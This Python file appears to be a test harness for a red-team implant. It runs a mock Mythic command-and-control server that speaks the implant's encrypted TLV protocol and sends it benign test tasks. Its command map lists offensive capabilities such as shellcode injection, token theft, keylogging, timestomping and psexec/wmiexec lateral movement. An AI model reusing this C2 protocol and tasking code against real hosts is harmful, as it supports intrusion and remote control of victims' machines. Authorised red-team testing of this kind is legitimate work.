#!/usr/bin/env python3
"""
Mock Mythic Server for Starburst Tier 1 testing.
Handles: checkin, key exchange (pre-shared), get_tasking, post_response.
Speaks the same AES+base64+TLV protocol as the real C2.
"""

import base64
import hashlib
import hmac
import json
import os
import struct
import sys
import threading
import time
import uuid
from http.server import HTTPServer, BaseHTTPRequestHandler

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding

# ── Test constants (must match config.h _MANUAL blob) ──
PAYLOAD_UUID = "11111111-1111-1111-1111-111111111111"
AES_KEY = bytes(range(32))  # 0x00..0x1f
CALLBACK_UUID = "22222222-2222-2222-2222-222222222222"
SERVER_UUID = "33333333-3333-3333-3333-333333333333"

# ── Protocol constants ──
ACTION_CHECKIN       = 0x01
ACTION_GET_TASKING   = 0x02
ACTION_POST_RESPONSE = 0x03
ACTION_CHECKIN_RSP   = 0x04

RESPONSE_SUCCESS = 0x00
RESPONSE_ERROR   = 0x01

CMD_MAP = {
    "exit":     0x01, "sleep":    0x02, "shell":    0x03,
    "upload":   0x04, "download": 0x05, "ls":       0x06,
    "cd":       0x07, "pwd":      0x08, "ps":       0x09,
    "whoami":   0x0A, "config":   0x0B, "shinject":  0x0C,
    "execute_pic": 0x0D, "cat":   0x0E, "mkdir":    0x0F,
    "rm":       0x10, "cp":       0x11, "mv":       0x12,
    "env":      0x13, "reg_query": 0x14, "screenshot": 0x15,
    "token_list": 0x16, "execute_assembly": 0x17,
    "execute_coff": 0x18, "jump_psexec": 0x19,
    "jump_scshell": 0x1A, "jump_wmiexec": 0x1B,
    "jump_dcomexec": 0x1C, "ifconfig": 0x1D,
    "netstat":  0x1E, "kill":     0x1F, "run":      0x20,
    "getprivs": 0x21, "listpipes": 0x22,
    "reg_write_value": 0x23, "make_token": 0x24,
    "steal_token": 0x25, "rev2self": 0x26,
    "net_localgroup": 0x27, "net_localgroup_member": 0x28,
    "jobkill": 0x29, "link": 0x2A, "unlink": 0x2B,
    "download_resp": 0x2C, "socks": 0x2D, "ssh": 0x2E, "rpfwd": 0x2F,
    "migrate": 0x30, "blockdlls": 0x31, "keylog": 0x32,
    "enumdesktops": 0x33, "timestomp": 0x34, "localtime": 0x35,
    "idletime": 0x36, "getuid": 0x37,
    "browserpivot": 0x38,
    "connect": 0x39, "disconnect": 0x3A,
}
CMD_MAP_REV = {v: k for k, v in CMD_MAP.items()}


# ── Crypto helpers ──
def aes_encrypt(key, plaintext):
    iv = os.urandom(16)
    padder = sym_padding.PKCS7(128).padder()
    padded = padder.update(plaintext) + padder.finalize()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    ct = cipher.encryptor().update(padded) + cipher.encryptor().finalize()
    # re-encrypt properly
    enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    ct = enc.update(padded) + enc.finalize()
    mac = hmac.new(key, iv + ct, hashlib.sha256).digest()
    return iv + ct + mac


def aes_decrypt(key, blob):
    if len(blob) < 64:
        raise ValueError(f"blob too short: {len(blob)}")
    iv = blob[:16]
    mac = blob[-32:]
    ct = blob[16:-32]
    expected = hmac.new(key, iv + ct, hashlib.sha256).digest()
    if not hmac.compare_digest(mac, expected):
        raise ValueError("HMAC mismatch")
    dec = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    padded = dec.update(ct) + dec.finalize()
    pad_val = padded[-1]
    if 0 < pad_val <= 16:
        padded = padded[:-pad_val]
    return padded


# ── TLV helpers ──
class Packer:
    def __init__(self):
        self.data = b""

    def add_byte(self, v):
        self.data += struct.pack("B", v)

    def add_int32(self, v):
        self.data += struct.pack(">I", v)

    def add_bytes(self, raw):
        self.add_int32(len(raw))
        self.data += raw

    def add_string(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8")
        self.add_bytes(s)

    def build(self):
        return self.data


class Parser:
    def __init__(self, data):
        self.data = data
        self.offset = 0

    def byte(self):
        v = self.data[self.offset]
        self.offset += 1
        return v

    def int32(self):
        v = struct.unpack(">I", self.data[self.offset:self.offset+4])[0]
        self.offset += 4
        return v

    def bytes_(self):
        length = self.int32()
        v = self.data[self.offset:self.offset+length]
        self.offset += length
        return v

    def string(self):
        return self.bytes_().decode("utf-8", errors="replace")

    def raw(self, n):
        v = self.data[self.offset:self.offset+n]
        self.offset += n
        return v

    def remaining(self):
        return len(self.data) - self.offset


# ── Test task queue ──
class TaskManager:
    ALL_TASKS = [
        {"command": "whoami", "params": {}},
        {"command": "pwd", "params": {}},
        {"command": "shell", "params": {"command": "echo STARBURST_TEST_OK"}},
        {"command": "ps", "params": {}},
        {"command": "ls", "params": {"path": "."}},
        {"command": "env", "params": {}},
        {"command": "ifconfig", "params": {}},
        {"command": "netstat", "params": {}},
        {"command": "getprivs", "params": {}},
        {"command": "listpipes", "params": {}},
        {"command": "net_localgroup", "params": {"hostname": ""}},
        {"command": "run", "params": {"command": "whoami"}},
        {"command": "cat", "params": {"path": "C:\\Windows\\System32\\drivers\\etc\\hosts"}},
        {"command": "sleep", "params": {"interval": 1000, "jitter": 0}},
        {"command": "exit", "params": {}},
    ]

    def __init__(self):
        self.checkin_data = None
        self.checked_in = False
        self.task_index = 0
        self.total_tasks = len(self.ALL_TASKS)
        self.all_sent = False

    def get_test_tasks(self):
        """Return next test task, one per get_tasking call."""
        if self.task_index < self.total_tasks:
            task = self.ALL_TASKS[self.task_index]
            self.task_index += 1
            if self.task_index >= self.total_tasks:
                self.all_sent = True
            return [task]
        return []


# ── Pack command params (mirrors to_agent.py) ──
def pack_params(cmd_name, params):
    pk = Packer()
    if cmd_name == "shell":
        pk.add_string(params.get("command", ""))
    elif cmd_name == "sleep":
        pk.add_int32(int(params.get("interval", 5000)))
        pk.add_int32(int(params.get("jitter", 0)))
    elif cmd_name in ("cd", "ls", "cat", "mkdir", "rm", "download"):
        pk.add_string(params.get("path", params.get("file", ".")))
    elif cmd_name == "run":
        pk.add_string(params.get("command", ""))
    elif cmd_name == "kill":
        pk.add_int32(int(params.get("pid", 0)))
    elif cmd_name == "steal_token":
        pk.add_int32(int(params.get("pid", 0)))
    elif cmd_name == "net_localgroup":
        pk.add_string(params.get("hostname", ""))
    elif cmd_name == "net_localgroup_member":
        pk.add_string(params.get("hostname", ""))
        pk.add_string(params.get("group", ""))
    elif cmd_name == "config":
        pk.add_int32(int(params.get("sleep", 0xFFFFFFFF)))
        pk.add_int32(int(params.get("jitter", 0xFFFFFFFF)))
        pk.add_int32(int(params.get("killdate", 0xFFFFFFFF)))
    elif cmd_name == "reg_query":
        pk.add_string(params.get("hive", "HKLM"))
        pk.add_string(params.get("key", ""))
    elif cmd_name == "make_token":
        pk.add_string(params.get("domain", "."))
        pk.add_string(params.get("username", ""))
        pk.add_string(params.get("password", ""))
    elif cmd_name == "reg_write_value":
        pk.add_string(params.get("hive", "HKLM"))
        pk.add_string(params.get("key", ""))
        pk.add_string(params.get("name", ""))
        pk.add_string(params.get("value", ""))
        pk.add_int32(int(params.get("type", 1)))
    elif cmd_name == "cp":
        pk.add_string(params.get("source", ""))
        pk.add_string(params.get("destination", ""))
    elif cmd_name == "mv":
        pk.add_string(params.get("source", ""))
        pk.add_string(params.get("destination", ""))
    # no-param commands: exit, whoami, pwd, ps, env, ifconfig, netstat,
    # getprivs, listpipes, rev2self, screenshot, token_list
    return pk.build()


# ── Test result tracking ──
test_results = {
    "checkin": None,
    "tasks_sent": 0,
    "responses": [],
    "errors": [],
    "passed": [],
    "failed": [],
}

task_mgr = TaskManager()
lock = threading.Lock()


class MockHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # quiet

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length)

        try:
            raw = base64.b64decode(body)
        except Exception as e:
            self._err(f"base64 decode failed: {e}")
            return

        if len(raw) < 36:
            self._err(f"too short: {len(raw)} bytes")
            return

        agent_uuid = raw[:36].decode("ascii", errors="replace")
        encrypted = raw[36:]

        try:
            plaintext = aes_decrypt(AES_KEY, encrypted)
        except Exception as e:
            self._err(f"decrypt failed: {e}")
            return

        if len(plaintext) < 1:
            self._err("empty plaintext")
            return

        action = plaintext[0]

        if action == ACTION_CHECKIN:
            self._handle_checkin(plaintext, agent_uuid)
        elif action == ACTION_GET_TASKING:
            self._handle_get_tasking(plaintext, agent_uuid)
        else:
            self._err(f"unknown action: 0x{action:02x}")

    def _handle_checkin(self, data, agent_uuid):
        with lock:
            p = Parser(data)
            p.byte()  # action

            checkin_uuid = p.string()
            ip_count = p.int32()
            ips = [p.string() for _ in range(ip_count)]
            os_ver = p.string()
            user = p.string()
            host = p.string()
            pid = p.int32()
            arch = p.string()
            domain = p.string()
            integrity = p.int32()
            ext_ip = p.string()
            proc_name = p.string()

            task_mgr.checkin_data = {
                "uuid": checkin_uuid, "ips": ips, "os": os_ver,
                "user": user, "host": host, "pid": pid,
                "arch": arch, "domain": domain,
                "integrity": integrity, "process_name": proc_name,
            }
            task_mgr.checked_in = True

            print(f"[CHECKIN] uuid={checkin_uuid} user={domain}\\{user} host={host} "
                  f"pid={pid} arch={arch} os={os_ver}")
            print(f"  IPs: {ips}")
            print(f"  Process: {proc_name}")

            test_results["checkin"] = "PASS"
            test_results["passed"].append("checkin")

        # respond with callback UUID
        pk = Packer()
        pk.add_byte(ACTION_CHECKIN_RSP)
        pk.add_string(CALLBACK_UUID)
        self._send_encrypted(pk.build())

    def _handle_get_tasking(self, data, agent_uuid):
        with lock:
            p = Parser(data)
            p.byte()  # action

            # parse queued responses
            responses_len = p.int32()
            print(f"[DEBUG] get_tasking: responses_len={responses_len}, remaining={p.remaining()}")
            if responses_len > 0 and p.remaining() >= responses_len:
                resp_data = p.raw(responses_len)
                try:
                    self._parse_responses(resp_data)
                except Exception as e:
                    print(f"[ERROR] Response parse failed: {e}")
                    print(f"  resp_data ({len(resp_data)} bytes): {resp_data[:100].hex()}...")
                    test_results["errors"].append(f"response parse: {e}")
            elif responses_len > 0:
                print(f"[WARN] responses_len={responses_len} but only {p.remaining()} bytes remaining")

            # send next test task
            tasks = task_mgr.get_test_tasks()

            pk = Packer()
            pk.add_byte(ACTION_GET_TASKING)
            pk.add_int32(len(tasks))

            for task in tasks:
                cmd_name = task["command"]
                cmd_id = CMD_MAP.get(cmd_name, 0)
                task_uuid = str(uuid.uuid4())

                pk.add_byte(cmd_id)
                pk.data += task_uuid.encode("utf-8").ljust(36, b"\x00")[:36]

                params_data = pack_params(cmd_name, task["params"])
                pk.add_int32(len(params_data))
                pk.data += params_data

                test_results["tasks_sent"] += 1
                print(f"[TASK] Sending: {cmd_name} (0x{cmd_id:02x}) uuid={task_uuid[:8]}...")

        self._send_encrypted(pk.build())

    def _parse_responses(self, data):
        offset = 0
        while offset < len(data):
            if offset + 4 > len(data):
                break
            rsp_size = struct.unpack(">I", data[offset:offset+4])[0]
            offset += 4
            if rsp_size == 0 or offset + rsp_size > len(data):
                print(f"[WARN] Bad response size: {rsp_size}, remaining: {len(data)-offset}")
                break
            rsp_data = data[offset:offset+rsp_size]
            offset += rsp_size

            try:
                p = Parser(rsp_data)
                action = p.byte()
                task_id = p.string()
                status = p.byte()

                if status == RESPONSE_ERROR:
                    output = p.string()
                    test_results["responses"].append({
                        "task_id": task_id[:8], "status": "error", "output": output[:200]
                    })
                    print(f"[RESPONSE] task={task_id[:8]}... STATUS=ERROR output={output[:100]}")
                    test_results["failed"].append(f"response:{task_id[:8]}")
                else:
                    remaining = p.remaining()
                    try:
                        output = p.string()
                    except Exception:
                        output = f"(binary data, {remaining} bytes)"
                    test_results["responses"].append({
                        "task_id": task_id[:8], "status": "success", "output": output[:200]
                    })
                    print(f"[RESPONSE] task={task_id[:8]}... STATUS=OK output_len={len(output)}")
                    test_results["passed"].append(f"response:{task_id[:8]}")
            except Exception as e:
                print(f"[ERROR] Failed to parse response ({len(rsp_data)} bytes): {e}")
                print(f"  hex: {rsp_data[:60].hex()}")
                test_results["errors"].append(f"parse response: {e}")

    def _send_encrypted(self, plaintext):
        encrypted = aes_encrypt(AES_KEY, plaintext)
        raw = SERVER_UUID.encode("ascii") + encrypted
        b64 = base64.b64encode(raw)
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(b64)))
        self.end_headers()
        self.wfile.write(b64)

    def _err(self, msg):
        print(f"[ERROR] {msg}")
        test_results["errors"].append(msg)
        self.send_response(400)
        self.end_headers()


def run_server(port=8080, timeout=60):
    server = HTTPServer(("0.0.0.0", port), MockHandler)
    server.timeout = 1

    print(f"Mock Mythic Server listening on port {port}")
    print(f"Payload UUID: {PAYLOAD_UUID}")
    print(f"AES Key: {AES_KEY.hex()}")
    print(f"Callback UUID: {CALLBACK_UUID}")
    print(f"Timeout: {timeout}s")
    print("=" * 60)

    start = time.time()
    while time.time() - start < timeout:
        server.handle_request()

        with lock:
            # exit once all tasks sent AND agent stops connecting (exit command kills it)
            if task_mgr.all_sent:
                # wait a bit more for final responses
                if len(test_results["responses"]) >= task_mgr.total_tasks - 2:
                    time.sleep(5)
                    break

    server.server_close()

    print()
    print("=" * 60)
    print("TEST RESULTS")
    print("=" * 60)
    print(f"Checkin: {test_results['checkin'] or 'NOT RECEIVED'}")
    print(f"Tasks sent: {test_results['tasks_sent']}")
    print(f"Responses received: {len(test_results['responses'])}")
    print(f"Errors: {len(test_results['errors'])}")

    if test_results['errors']:
        print("\nErrors:")
        for e in test_results['errors']:
            print(f"  - {e}")

    print(f"\nPassed: {len(test_results['passed'])}")
    print(f"Failed: {len(test_results['failed'])}")

    if test_results['failed']:
        print("\nFailed items:")
        for f in test_results['failed']:
            print(f"  - {f}")

    print("\nResponses:")
    for r in test_results['responses']:
        status_icon = "+" if r['status'] == 'success' else "!"
        output_preview = r['output'][:80].replace('\n', '\\n') if r['output'] else "(empty)"
        print(f"  [{status_icon}] {r['task_id']}... {r['status']}: {output_preview}")

    # exit code
    if test_results['checkin'] == 'PASS' and len(test_results['failed']) == 0:
        print("\n>>> ALL TESTS PASSED <<<")
        return 0
    else:
        print("\n>>> SOME TESTS FAILED <<<")
        return 1


if __name__ == "__main__":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    timeout = int(sys.argv[2]) if len(sys.argv) > 2 else 90
    sys.exit(run_server(port, timeout))
